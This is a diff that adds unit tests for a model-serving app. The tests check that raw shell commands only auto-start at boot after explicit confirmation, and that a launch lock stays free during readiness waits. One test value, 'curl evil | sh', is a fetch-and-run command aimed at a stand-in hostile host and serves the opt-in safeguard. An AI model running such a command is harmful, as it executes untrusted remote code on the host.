@@ -374,3 +374,103 @@ class BootOrderTests(unittest.IsolatedAsyncioTestCase):
 
 if __name__ == '__main__':
     unittest.main()
+
+
+class RawCommandOptInTests(unittest.TestCase):
+    """Raw shell commands only start at boot after an explicit confirmation."""
+
+    def setUp(self):
+        import server
+        self.server = server
+        conn = sqlite3.connect(':memory:', check_same_thread=False, isolation_level=None)
+        conn.row_factory = sqlite3.Row
+        self.addCleanup(conn.close)
+        p = mock.patch.object(db, '_conn', conn)
+        p.start()
+        self.addCleanup(p.stop)
+        db.init()
+
+    def test_store_fails_closed_until_the_exact_command_is_confirmed(self):
+        raw = dict(name='raw', engine='vllm', args={}, raw_cmd='docker run img vllm serve m',
+                   auto_start=True)
+        rid = db.recipes_upsert(dict(raw))['id']  # create/import path: no confirmation
+        self.assertEqual(db.recipes_get(rid)['auto_start'], 0)
+        db.recipes_upsert({**db.recipes_get(rid), 'auto_start': True, '_confirm_raw_autostart': True})
+        self.assertEqual(db.recipes_get(rid)['auto_start'], 1)
+        db.recipes_upsert({**db.recipes_get(rid), 'name': 'renamed'})  # same command: kept
+        self.assertEqual(db.recipes_get(rid)['auto_start'], 1)
+        db.recipes_upsert({**db.recipes_get(rid), 'raw_cmd': 'curl evil | sh'})  # edited command
+        self.assertEqual(db.recipes_get(rid)['auto_start'], 0)
+        self.assertEqual(db.recipes_list_autostart(), [])
+        spark = db.recipes_upsert(dict(name='s', engine='sparkrun', args={'_sparkrun': {'ref': '@a/b'}},
+                                       raw_cmd='sparkrun run @a/b', auto_start=True))
+        self.assertEqual(spark['auto_start'], 1)  # launched from its ref, not from raw_cmd
+
+    def test_api_requires_confirmation_and_import_cannot_bypass_it(self):
+        from fastapi.testclient import TestClient
+        client = TestClient(self.server.app)
+        payload = dict(name='raw', engine='vllm', args={}, raw_cmd='docker run img vllm serve m')
+        created = client.post('/api/recipes', json={**payload, 'auto_start': True}).json()
+        self.assertEqual(created['auto_start'], 0)
+        rid = created['id']
+        refused = client.patch(f'/api/recipes/{rid}', json={'auto_start': True})
+        self.assertEqual(refused.status_code, 409)
+        self.assertIn('raw shell command', refused.json()['detail'])
+        self.assertEqual(db.recipes_get(rid)['auto_start'], 0)
+        ok = client.patch(f'/api/recipes/{rid}', json={'auto_start': True, 'confirm_raw_cmd': True})
+        self.assertEqual(ok.status_code, 200)
+        self.assertEqual(ok.json()['auto_start'], 1)
+        self.assertEqual(client.post('/api/recipes', json={**payload, 'id': rid}).json()['auto_start'], 1)
+        edited = client.post('/api/recipes', json={**payload, 'id': rid, 'raw_cmd': 'docker run other'})
+        self.assertEqual(edited.json()['auto_start'], 0)
+        plain = client.post('/api/recipes', json=dict(name='p', engine='llamacpp', args={})).json()
+        self.assertEqual(client.patch(f"/api/recipes/{plain['id']}", json={'auto_start': True}).json()['auto_start'], 1)
+
+
+class LaunchLockScopeTests(unittest.TestCase):
+    def test_lock_is_free_while_the_boot_queue_waits_for_readiness(self):
+        import shlex
+        import sys
+        import threading
+        import time
+        import autostart
+        import runners
+        import server
+        conn = sqlite3.connect(':memory:', check_same_thread=False, isolation_level=None)
+        conn.row_factory = sqlite3.Row
+        self.addCleanup(conn.close)
+        manager = runners.Runner()
+        with tempfile.TemporaryDirectory() as tmp, \
+             mock.patch.object(db, '_conn', conn), \
+             mock.patch.object(server, 'runner', manager), \
+             mock.patch.object(runners, 'RUN_LOG_DIR', Path(tmp)), \
+             mock.patch.object(manager, '_reclaim_after_teardown'), \
+             mock.patch.object(runners, '_mem_total_gb', return_value=None), \
+             mock.patch.dict(os.environ, {'SPARK_STUDIO_AUTOSTART_TIMEOUT': '30'}):
+            db.init()
+            db._add_col_if_missing('runs', 'meta_json', 'TEXT')
+            rec = db.recipes_upsert(dict(name='slow', engine='llamacpp', args={},
+                raw_cmd=shlex.join([sys.executable, '-u', '-c',
+                                    "import time; print('loading', flush=True); time.sleep(30)"])))
+            queue = autostart.BootQueue(lambda: [rec], lambda: {'status': 'ok'},
+                                        server._autostart_launch, lambda: list(manager.runs.values()))
+            worker = threading.Thread(target=lambda: asyncio.run(queue.run()), daemon=True)
+            worker.start()
+            try:
+                deadline = time.monotonic() + 5
+                while not manager.runs and time.monotonic() < deadline:
+                    time.sleep(.01)
+                run = next(iter(manager.runs.values()))
+                self.assertEqual(queue.status()['state'], 'running')
+                self.assertFalse(run.ready)
+                # A manual Run would take this lock now: it must not wait behind readiness.
+                acquired = runners._launch_lock.acquire(timeout=1)
+                self.assertTrue(acquired, 'launch lock held while waiting for readiness')
+                runners._launch_lock.release()
+                self.assertEqual(queue.status()['state'], 'running')
+            finally:
+                queue.stop()
+                worker.join(5)
+                for r in list(manager.runs.values()):
+                    manager.stop(r.id)
+            self.assertFalse(worker.is_alive())
